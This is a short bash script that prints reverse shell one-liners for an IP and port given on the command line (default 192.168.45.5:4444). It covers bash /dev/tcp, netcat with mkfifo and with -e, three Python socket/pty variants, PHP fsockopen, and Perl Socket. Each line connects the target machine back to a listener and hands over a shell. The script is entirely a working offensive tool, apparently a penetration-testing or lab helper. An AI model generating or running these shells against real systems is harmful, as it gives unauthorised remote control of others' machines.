#!/bin/bash

# Define the usage function
usage() {
  echo "Usage: $0 [-t <string>] [-i <string>] [-p <int>]" 1>&2
  exit 1
}

# Initialize default values
ip="192.168.45.5"
port=4444
tool="all"

# Parse the command-line arguments
while getopts ":t:i:p:" opt; do
  case ${opt} in
    t )
      tool=$OPTARG
      ;;
    i )
      ip=$OPTARG
      ;;
    p )
      port=$OPTARG
      ;;
    * )
      usage
      ;;
  esac
done
shift $((OPTIND -1))

# Define the strings for each tool
bash_string="======================================================================
[+ BASH]
/bin/sh -i >& /dev/tcp/$ip/$port 0>&1

"

netcat_string="======================================================================
[+ NETCAT]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f

nc $ip $port -e /bin/sh

"

python_string="======================================================================
[+ PYTHON]
python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'

"

php_string="======================================================================
[+ PHP]
php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh <&3 >&3 2>&3\");'

"

perl_string="======================================================================
[+ PERL]
perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'

"

# Check the tool argument and print the appropriate string(s)
case $tool in
  bash)
    echo -e "$bash_string"
    ;;
  nc)
    echo -e "$netcat_string"
    ;;
  py)
    echo -e "$python_string"
    ;;
  php)
    echo -e "$php_string"
    ;;
  perl)
    echo -e "$perl_string"
    ;;
  all)
    echo -e "$bash_string$netcat_string$python_string$php_string$perl_string"
    ;;
  *)
    echo "Invalid tool argument."
    usage
    ;;
esac
